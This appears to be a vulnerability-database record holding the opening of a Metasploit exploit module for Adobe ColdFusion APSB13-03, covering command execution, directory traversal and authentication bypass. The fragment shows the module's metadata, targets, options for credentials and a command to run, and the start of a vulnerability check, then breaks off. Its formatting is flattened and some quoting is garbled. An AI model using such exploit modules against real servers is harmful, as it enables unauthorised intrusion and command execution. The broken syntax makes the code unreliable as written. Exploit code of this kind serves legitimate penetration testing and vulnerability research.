{
    "text": "vul_name : Adobe ColdFusion APSB13-03 Remote Exploit ， vul_cve : CVE-2013-0625 , CVE-2013-0629 , CVE-2013-0632 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， require 'digest/sha1' ， require 'openssl' ， class Metasploit3 < Msf : Exploit : Remote ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer ， super ( update_info ( info ,  ， 'Name' => 'Adobe ColdFusion APSB13-03' ,  ， 'Description' => %q{ ， This module exploits a pile of vulnerabilities in Adobe ColdFusion APSB13-03 :  ，  * CVE-2013-0625 : arbitrary command execution in scheduleedit.cfm ( 9.x only )  ，  * CVE-2013-0629 : directory traversal ，  * CVE-2013-0632 : authentication bypass ， } ,  ， 'Author' => ，  [  ， 'Jon Hart <jon_hart [ at ] rapid7.com' ,  # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-0625' ]  ,  ，  [ 'CVE' , '2013-0629' ]  ,  ，  # we don't actually exploit this , as this is the backdoor ，  # dropped by malware exploiting the other vulnerabilities ，  [ 'CVE' , '2013-0631' ]  ,  ，  [ 'CVE' , '2013-0632' ]  ,  ，  ]  ,  ， 'Targets' => ，  [  ，  [ 'Automatic Targeting' , { 'auto' => true } ]  ,  ，  [  ， 'Universal CMD' ,  ， { ， 'Arch' => ARCH_CMD ,  ， 'Platform' => [ 'unix' , 'win' , 'linux' ]  ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 1 ,  ， 'Privileged' => true ,  ， 'Platform' => [ 'win' , 'linux' ]  ,  ， 'DisclosureDate' => 'Jan 15 2013' )  ， register_options (  ，  [  ， Opt : RPORT ( 80 )  ,  ， OptString.new ( 'USERNAME' ,  [ false , 'The username to authenticate as' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , 'The password for the specified username' ]  )  ,  ， OptBool.new ( 'USERDS' ,  [ true , 'Authenticate with RDS credentials' , true ]  )  ,  ， OptString.new ( 'CMD' ,  [ false , 'Command to run rather than dropping a payload' , ' ]  )  ,  ，  ]  , self.class )  ， register_advanced_options (  ，  [  ， OptBool.new ( 'DELETE_TASK' ,  [ true , 'Delete scheduled task when done' , true ]  )  ,  ，  ]  , self.class )  ， end ， def check ， exploitable = 0 ， exploitable += 1 if check_cve_2013_0629 ， exploitable += 1 if check_cve_2013_0632",
    "time": "2013.04.10"
}